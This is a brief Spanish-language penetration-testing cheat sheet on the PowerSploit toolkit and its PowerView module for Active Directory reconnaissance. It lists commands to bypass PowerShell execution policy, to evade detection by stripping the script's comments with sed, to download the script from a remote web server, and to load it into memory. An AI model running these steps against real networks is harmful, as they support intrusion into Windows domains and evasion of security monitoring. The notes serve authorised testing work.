# PowerSploit

Tags: #AD #PowerView #PowerSploit 

* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

```bas 
Es una colección de módulos de PowerShell que puedes usar para asistirte durante las pruebas de penetración durante todas las fases de una evaluación. 
```
## PowerView 

* [PowerView](https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1)

```bash 
El módulo de PowerView puede llegar a generar alertas inofensivas en los sistemas de seguridad 
```

```powershell
❯ powershell -ep bypass        # Permirit la ejecución de scripts en Powershell 
```

```powershell 
# Una forma de evadir la detección al ejecutar el script desde Windows es eliminando los comentarios del script desde Kali
❯ sed '/<#/,/#>/d' PowerView.ps1 > new_PowerView.ps1  
```

```powershell 
# Descargar y guardar el ejecutable en Windows 
❯ (New-Object System.Net.WebClient).DownloadFile("https://webserver:8000/new_PowerView.ps1", "PowerView.ps1")  
```

```powershell 
❯ . .\PowerView.ps1                   # Cargar PowerView en memoria 
❯ Import-Module .\PowerView.ps1       # Importar el módulo 
```

